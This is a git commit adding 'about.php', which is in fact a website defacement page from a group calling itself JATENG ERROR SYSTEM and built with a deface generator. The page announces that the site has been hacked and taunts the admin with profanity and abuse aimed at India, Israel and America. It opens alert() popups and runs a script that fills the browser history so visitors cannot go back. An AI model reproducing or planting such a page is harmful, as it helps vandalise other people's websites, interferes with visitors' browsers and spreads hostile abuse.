114c225c4346806ff3a72a22255b4c2862303460
ZenEek18 <jonocraft61@gmail.com>
2024-05-31 10:50:25 +0700

    Add files via upload

---
+++ about.php
@@ -0,0 +1,151 @@
+<!--
+--  Downloaded from : https://haxor.my.id/save/HACKERS-DEFACE.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+-->
+<SCRIPT> alert("HACKED BY JATENG ERROR SYSTEM")</SCRIPT>
+<script>alert("YOU HAVE BEEN PWNED ")</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>TEAM JATENG ERROR SYSTEM</title>
+  <style type="text/css">
+     body{ background-color:black; } 
+    
+     h1{ 
+       
+     text-decoration: none; 
+     
+     border-radius:0px; 
+     
+     border:0px; 
+     
+     font-family: 'Iceland', cursive; 
+     
+     font-size:22px; 
+     
+     margin:0px; padding:0px; 
+     
+     animation:psychoxploit 0.5s linear infinite;
+
+     }
+     
+       h3{
+        color:silver;
+         font-size: 10px;
+         text-shadow: 0px 0px 10px blue;
+         font-family:kalam;
+
+       }
+       
+    
+     
+     pre{ color:grey; } marquee{ width:100%; } @keyframes psychoxploit{ 2%{color:#fff;} 3%{transform:translate(2px,-10px) skewX(3240deg);} 5%{transform:translate(0px,0px) skewX(0deg);} 2% , 54%{transform:translateX(0px) skew(0deg);} 55%{transform:translate(-2px,6px) skew(-5530deg);} 56%{transform:translate(0px,0px) skew(0deg);} 57%{transform:translate(4px,-10px) skew(-70deg);} 58%{transform:translate(0px,0px) skew(0deg);} 62%{transform:translate(0px,20px) skew(0deg);} 63%{transform:translate(4px,-2px) skew(0deg);} 90%{transform:translate(1px,3px); skew(-230deg);} 95%{transform:translate(-7px,2px); skew(-120deg);} 100%{transform:translate(0px,0px) skew(0deg);} 
+  </style>
+</head>
+<body>
+  <title>HACKEDBY JATENG ERROR SYSTEM</title>
+  <link href=
+  "https://fonts.googleapis.com/css2?family=Iceland&amp;display=swap"
+  rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Jura" rel=
+  "stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"
+  crossorigin="">
+  <link href=
+  "https://fonts.googleapis.com/css2?family=Iceland&amp;family=Kalam:wght@300&amp;display=swap"
+  rel="stylesheet">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1.0">
+  <meta name="description" content="Zen">
+  <meta name="author" content="Zen">
+  <meta name="keywords" content="Zen">
+  <meta name="googlebot" content="all">
+  <meta name="robots" content="all">
+  <meta name="googlebot-news" content="all">
+  <meta name="google" content="notranslate">
+  <meta name="og:title" content="BayxzXploit">
+  <script>
+  (function () { for(var i = 0; i < 20; i++) { history.pushState(null, document.title, window.location.href ); } })(document, window, history); 
+  </script>
+  <center>
+    <img src="https://l.top4top.io/p_3068b9bmd0.jpg"
+    height="180" widht="180"><br>
+    <center>
+      <h1><font color="#9D9D9D">HACKED BY</font> <font color=
+      "silver">JATENG ERROR SYSTEM</font></h1><br>
+      <br>
+      <center>
+        <h1 class="nprinsleyy nprinsley-text-rainbowan" style="font-size:28px;">JATENG ERROR SYSTEM</h1>
+        <font face="Iceland" size="3" color="white">- Hello Admin !
+        - <font size="2">Your Website Has Been Hacked By JATENG ERROR SYSTEM
+        <font face="Iceland" size="3" color="white">FUCK</font></font></font>
+        <center>
+          <font face="Iceland" size="3" color="white"><font size=
+          "2"><font face="Iceland" size="3" color=
+          "white"><font face="Iceland" size="3" color="white">JATENG ERROR SYSTEM</font></font></font></font>
+          <center>
+            <font face="Iceland" size="3" color="white"><font size=
+            "2"><font face="Iceland" size="3" color=
+            "white"><font size="3" color="white">- ENJOY THE
+            DESTRUCTION OF YOUR WEBSITE -<br>
+            <font face="Iceland" color="white">- FUCK INDIA ISRAEL AMERIKA
+            BHARAT-</font><br>
+            <br></font></font></font></font>
+            <center>
+              <font face="Iceland" size="3" color=
+              "white"><font size="2"><font face="Iceland" size="3"
+              color="white"><font size="3" color=
+              "white"><font size="3" color="red">JATENG ERROR SYSTEM
+                </font><br>
+              <br></font></font></font></font>
+              <center>
+                <font face="Iceland" size="3" color=
+                "white"><font size="2"><font face="Iceland" size=
+                "3" color="white"><font size="3" color=
+                "white"><font face="Iceland" size="2" color=
+                "silver">"
+                Zen "</font><br></font></font></font></font>
+                <center>
+                  <font face="Iceland" size="3" color=
+                  "white"><font size="2"><font face="Iceland" size=
+                  "3" color="white"><font size="3" color=
+                  "white"><font face="Iceland" size="2" color=
+                  "green"><marquee>~  ZEN ~</marquee></font><br>
+                  <br>
+                  <button class="lagu" onclick=
+                  "play();liat();"><font face="Pacifico" size=
+                  "2">Play</font></button> <button class="lagu"
+                  onclick="pause();liat();"><font face=
+                  "Pacifico"><font size="2"><font color=
+                  "black">Pause</font></font></font> <font face=
+                  "Pacifico"><br>
+                  <br>
+                  <audio id="lagu" src=
+                  "https://files.catbox.moe/fj77m8.mp3"><font face=
+                  "Iceland" size="3" color="white"><font size=
+                  "2"><font face="Iceland" size="3" color=
+                  "white"><font size="3" color="white"> 
+                  <script>
+                  function play(){ var audio = document.getElementById('lagu'); audio.play(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } function pause(){ var audio = document.getElementById('lagu'); audio.pause(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } 
+                  </script></font></font></font></font></audio></font></button></font></font></font></font>
+                </center>
+                <center>
+                  <font face="Iceland" size="3" color=
+                  "white"><font size="2"><font face="Iceland" size=
+                  "3" color="white"><font size="3" color=
+                  "white"><font face="Iceland" size="4" color=
+                  "white">- LOL*/
+                  -</font></font></font></font></font>
+                </center>
+              </center>
+            </center>
+          </center>
+        </center>
+      </center>
+    </center>
+  </center>
+</body>
+</html>
